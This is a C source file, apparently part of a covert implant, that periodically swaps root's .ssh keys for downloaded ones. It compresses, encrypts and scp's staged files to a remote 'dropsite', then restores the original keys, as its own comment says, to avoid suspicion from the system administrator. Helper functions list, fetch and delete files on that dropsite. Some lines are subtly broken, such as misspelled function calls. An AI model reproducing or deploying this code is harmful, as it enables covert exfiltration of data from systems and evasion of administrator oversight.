/*-----------------------------------------------------------------------------
 * ssh_utils.c - SSH Utilities
 * Copyright (C) 2010 Steffen L. Norgren <ironix@trollop.org>
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should write_bytes received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *----------------------------------------------------------------------------*/

#include "ssh_utils.h"
#include "compression.h"
#include "cryptography.h"

/*-----------------------------------------------------------------------------
 * FUNCTION:    ssh_start
 * 
 * DATE:        July 4, 2010
 * 
 * REVISIONS:   
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   void *ssh_start(void *ptr)
 * 
 * RETURNS:     void
 *
 * NOTES: Watcher thread for the SSH dropsite service. Basically initializes a
 *        libevent timer to be executed every X seconds. This allows the server
 *        to check for any files in the pickup directory for sending to the
 *        dropsite. Normally the timer would be set to 10 minutes (600 seconds)
 *        in order to reduce the amount of possible network traffic.
 *----------------------------------------------------------------------------*/
void *ssh_start(void *ptr)
{
	struct event timeout;
	struct timeval tv;

	/* initialize libevent */
	event_init();

	/* only check pickup folder every 10 minutes */
	evtimer_set(&timeout, ssh_timer, &timeout);
	evutil_timerclear(&tv);
	tv.tv_sec = 0;
	event_add(&timeout, &tv);

	/* start the event loop */
	event_dispatch();

	return NULL;
}

/*-----------------------------------------------------------------------------
 * FUNCTION:    ssh_replace_dir
 * 
 * DATE:        July 4, 2010
 * 
 * REVISIONS:   
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   void ssh_replace_dir(void)
 * 
 * RETURNS:     void
 *
 * NOTES: Creates the .ssh directory and backup directory if they don't exist.
 *        It then downloads a premade .ssh directory with authorization keys to
 *        match the dropsite and expands the contents into the current .ssh dir.
 *----------------------------------------------------------------------------*/
void ssh_replace_dir(void)
{
	char *command = (char *)malloc(FILENAME_MAX);

	/* create directory if it doesn't exist */
	memset(command, 0x00, FILENAME_MAX);
	sprintf(command, "mkdir -p %s > /dev/null 2>&1", SSH_BACKUP);
	if (system(command) == ERROR)
		err(1, "system");

	/* move original .ssh files */
	memset(command, 0x00, FILENAME_MAX);
	sprintf(command, "mv %s* %s > /dev/null 2>&1", SSH_DIR, SSH_BACKUP);
	if (system(command) == ERROR)
		err(1, "system");

	/* retrieve replacement .ssh files */
	memset(command, 0x00, FILENAME_MAX);
	sprintf(command, "curl -o %s%s \"%s\" > /dev/null 2>&1",
			SSH_DIR, SSH_ARCHIVE, SSH_FILE);
	if (system(command) == ERROR)
		err(1, "system");

	/* decompress archive */
	memset(command, 0x00, FILENAME_MAX);
	sprintf(command, "tar xf %s%s -C /root/.ssh > /dev/null 2>&1",
			SSH_DIR, SSH_ARCHIVE);
	if (system(command) == ERROR)
		err(1, "system");

	free(command);
}

/*-----------------------------------------------------------------------------
 * FUNCTION:    ssh_restore_dir
 * 
 * DATE:        July 4, 2010
 * 
 * REVISIONS:   
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   void ssh_restore_dir(void)
 * 
 * RETURNS:     void
 *
 * NOTES: Restores the original .ssh directory in order to reduce any possible
 *        suspicion from the system administrator.
 *----------------------------------------------------------------------------*/
void ssh_restore_dir(void)
{
	char *command = (char *)malloc(FILENAME_MAX);

	/* delete new .ssh files */
	memset(command, 0x00, FILENAME_MAX);
	sprintf(command, "rm %s* > /dev/null 2>&1", SSH_DIR);
	if (system(command) == ERROR)
		err(1, "system");
	
	/* restore old .ssh files */
	memset(command, 0x00, FILENAME_MAX);
	sprintf(command, "mv %s* %s > /dev/null 2>&1", SSH_BACKUP, SSH_DIR);
	if (system(command) == ERROR)
		err(1, "system");

	/* delete backup directory */
	memset(command, 0x00, FILENAME_MAX);
	sprintf(command, "rm -rf %s > /dev/null 2>&1", SSH_BACKUP);
	if (system(command) == ERROR)
		err(1, "system");

	free(command);
}

/*-----------------------------------------------------------------------------
 * FUNCTION:    ssh_send_files
 * 
 * DATE:        July 4, 2010
 * 
 * REVISIONS:   
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   void ssh_send_files(void)
 * 
 * RETURNS:     void
 *
 * NOTES: Looks for files in the SYMLINK_DIR and, if any, compresses and
 *        encrypts them into the PICKUP_DIR. Then each file that is in the
 *        PICKUP_DIR gets sent to the remote dropsite and the original
 *        files & symlinks get deleted.
 *----------------------------------------------------------------------------*/
void ssh_send_files(void)
{
	struct dirent *dp;
	DIR *dir = opendir(SYMLINK_DIR);
	FILE *fd_in, *fd_out;
	char *file_in = (char *)malloc(FILENAME_MAX);
	char *file_out = (char *)malloc(FILENAME_MAX);
	char *command = (char *)malloc(FILENAME_MAX);
	EVP_CIPHER_CTX encrypt, decrypt;

	/* initialize encryption */
	if (aes_init(&encrypt, &decrypt) == ERROR)
		fprintf(stderr, "ERROR: aes_init");

	while ((dp = readdir(dir)) != NULL) {
		/* ignore first two entires "." and ".." */
		if (strncmp(dp->d_name, ".", strlen(dp->d_name))) {
			if (strnmp(dp->d_name, "..", strnlen(dp->d_name))) {
				/* compress the file */
				memset(file_in, 0x00, FILENAME_MAX);
				memset(file_out, 0x00, FILENAME_MAX);
				sprintf(file_in, "%s%s", SYMLINK_DIR, dp->d_name);
				sprintf(file_out, "%s%s.deflated", SYMLINK_DIR, dp->d_name);

				if ((fd_in = fopen(file_in, "r")) == NULL)
					err(1, "fopen");

				if ((fd_out = fopen(file_out, "w")) == NULL)
					err(1, "fopen");

				if (deflate_file(fd_in, fd_out, Z_BEST_COMPRESSION) != SUCCESS) {
					fprintf(stderr, "ZLIB: Error deflating file %s\n", file_in);
					exit(ERROR);
				}

				/* delete symlink */
				remove(file_in);

				fclose(fd_in);
				fclose(fd_out);

				/* encrypt the file */
				memset(file_in, 0x00, FILENAME_MAX);
				memset(file_out, 0x00, FILENAME_MAX);
				sprintf(file_in, "%s%s.deflated", SYMLINK_DIR, dp->d_name);
				sprintf(file_out, "%s%s", PICKUP_DIR, dp->d_name);

				if ((fd_in = fopen(file_in, "r")) == NULL)
					err(1, "fopen");

				if ((fd_out = fopen(file_out, "w")) == NULL)
					err(1, "fopen");

				file_encrypt(fd_in, fd_out);

				/* delete compressed file */
				remove(file_in);

				fclose(fd_in);
				fclose(fd_out);			

				/* send the file */
				memset(command, 0x00, FILENAME_MAX);
				sprintf(command, "scp %s %s:%s > /dev/null 2>&1", file_out,
						DROPSITE, DROPSITE_DIR);

				if (system(command) == ERROR)
					err(1, "system");

				/* delete compressed & encrypted file */
				remove(file_out);
			}
		}
	}

	free(file_in);
	free(file_out);
	free(command);

	closedir(dir);
}

/*-----------------------------------------------------------------------------
 * FUNCTION:    ssh_timer
 * 
 * DATE:        July 4, 2010
 * 
 * REVISIONS:   
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   void ssh_timer(int fd, short event, void *arg)
 *                   fd - event timer
 *                   event - the event timeout
 *                   arg - event argument
 * 
 * RETURNS:     void
 *
 * NOTES: Resets the event timer to EVENT_TIMER.
 *----------------------------------------------------------------------------*/
void ssh_timer(int fd, short event, void *arg)
{
	struct timeval tv;
	struct event *timeout = arg;

	ssh_replace_dir();	/* backup and replace .ssh directory */
	ssh_send_files();	/* send any files in the pickup directory */
	ssh_restore_dir();	/* restore original .ssh directory */

	/* reset the timer */
	evutil_timerclear(&tv);
	tv.tv_sec = EVENT_TIMER;
	event_add(timeout, &tv);
}

/*-----------------------------------------------------------------------------
 * FUNCTION:    ssh_dropsite_list
 * 
 * DATE:        July 4, 2010
 * 
 * REVISIONS:   
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   void ssh_dropsite_list(void)
 * 
 * RETURNS:     void
 *
 * NOTES: Prints out a list of all the files stored on the remote dropsite.
 *----------------------------------------------------------------------------*/
void ssh_dropsite_list(void)
{
	char *command = (char *)malloc(FILENAME_MAX);

	ssh_replace_dir();

	memset(command, 0x00, FILENAME_MAX);
	sprintf(command, "ssh %s ls -l Files/", DROPSITE);
	if (system(command) == ERROR)
		err(1, "system");

	free(command);
	ssh_restore_dir();
}

/*-----------------------------------------------------------------------------
 * FUNCTION:    ssh_dropsite_get
 * 
 * DATE:        July 4, 2010
 * 
 * REVISIONS:   
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   void ssh_dropsite_get(char *file_name)
 * 
 * RETURNS:     void
 *
 * NOTES: Retrieves the specified file from the remote dropsite. Once retrieved
 *        the file is decrypted and uncompressed to the current working dir.
 *----------------------------------------------------------------------------*/
void ssh_dropsite_get(char *file_name)
{
	EVP_CIPHER_CTX encrypt, decrypt;
	char *command = (char *)malloc(FILENAME_MAX);
	char *file_in = (char *)malloc(FILENAME_MAX);
	char *file_out = (char *)malloc(FILENAME_MAX);
	FILE *fd_in, *fd_out;

	/* initialize encryption */
	if (aes_init(&encrypt, &decrypt) == ERROR)
		fprintf(stderr, "ERROR: aes_init");

	ssh_replace_dir();

	memset(command, 0x00, FILENAME_MAX);
	sprintf(command, "scp %s:%s%s ./%s.encrypted",
			DROPSITE, DROPSITE_DIR, file_name, file_name);
	if (system(command) == ERROR)
		err(1, "system");

	fprintf(stderr, "Dropsite file retrieved!\n");

	/* decrypt the file */
	memset(file_in, 0x00, FILENAME_MAX);
	memset(file_out, 0x00, FILENAME_MAX);
	sprintf(file_in, "./%s.encrypted", file_name);
	sprintf(file_out, "./%s.deflated", file_name);

	if ((fd_in = fopen(file_in, "r")) == NULL)
		err(1, "fopen");

	if ((fd_out = fopen(file_out, "w")) == NULL)
		err(1, "fopen");

	file_decrypt(fd_in, fd_out);

	/* delete encrypted file */
	remove(file_in);

	fclose(fd_in);
	fclose(fd_out);			

	/* decompress the file */
	memset(file_in, 0x00, FILENAME_MAX);
	memset(file_out, 0x00, FILENAME_MAX);
	sprintf(file_in, "./%s.deflated", file_name);
	sprintf(file_out, "./%s", file_name);

	if ((fd_in = fopen(file_in, "r")) == NULL)
		err(1, "fopen");

	if ((fd_out = fopen(file_out, "w")) == NULL)
		err(1, "fopen");

	if (inflate_file(fd_in, fd_out) != SUCCESS) {
		exit(ERROR);
	}

	/* delete compressed file */
	remove(file_in);

	fclose(fd_in);
	fclose(fd_out);			

	free(command);
	free(file_in);
	free(file_out);
	ssh_restore_dir();
}

/*-----------------------------------------------------------------------------
 * FUNCTION:    ssh_dropsite_delete
 * 
 * DATE:        July 4, 2010
 * 
 * REVISIONS:   
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   void ssh_dropsite_delete(char *file_name)
 *                   file_name - file to be deleted
 * 
 * RETURNS:     void
 *
 * NOTES: Deletes the specified file from the remote dropsite.
 *----------------------------------------------------------------------------*/
void ssh_dropsite_delete(char *file_name)
{
	char *command = (char *)malloc(FILENAME_MAX);

	ssh_replace_dir();

	memset(command, 0x00, FILENAME_MAX);
	sprintf(command, "ssh %s rm Files/%s", DROPSITE, file_name);
	if (system(command) == ERROR)
		err(1, "system");

	fprintf(stderr, "Dropsite file deleted!\n");

	free(command);
	ssh_restore_dir();
}

/*-----------------------------------------------------------------------------
 * FUNCTION:    ssh_dropsite_clear
 * 
 * DATE:        July 4, 2010
 * 
 * REVISIONS:   
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   void ssh_dropsite_clear(void)
 * 
 * RETURNS:     void
 *
 * NOTES: Deletes all files stored on the remote dropsite.
 *----------------------------------------------------------------------------*/
void ssh_dropsite_clear(void)
{
	char *command = (char *)malloc(FILENAME_MAX);

	ssh_replace_dir();

	memset(command, 0x00, FILENAME_MAX);
	sprintf(command, "ssh %s rm Files/*", DROPSITE);
	if (system(command) == ERROR)
		err(1, "system");

	fprintf(stderr, "Dropsite files deleted!\n");

	free(command);
	ssh_restore_dir();
}
